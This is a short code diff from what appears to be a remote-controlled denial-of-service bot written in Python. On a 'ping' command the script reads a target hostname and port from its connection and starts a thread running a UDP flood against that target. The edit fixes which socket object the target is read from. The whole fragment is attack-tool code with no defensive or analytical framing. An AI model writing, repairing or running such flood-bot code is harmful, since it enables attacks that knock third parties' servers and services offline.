@@ -72,8 +72,8 @@ def main():
                             if 'noping' in decoded:
                                     stop = True
                             if 'ping' in decoded:
-                                    hostname = conn.recv(1024).decode('utf-8')
-                                    port = conn.recv(1024)
+                                    hostname = client.recv(1024).decode('utf-8')
+                                    port = client.recv(1024)
                                     t1 = threading.Thread(target=udpflood, args=(hostname, port))
                                     t1.start()
                             
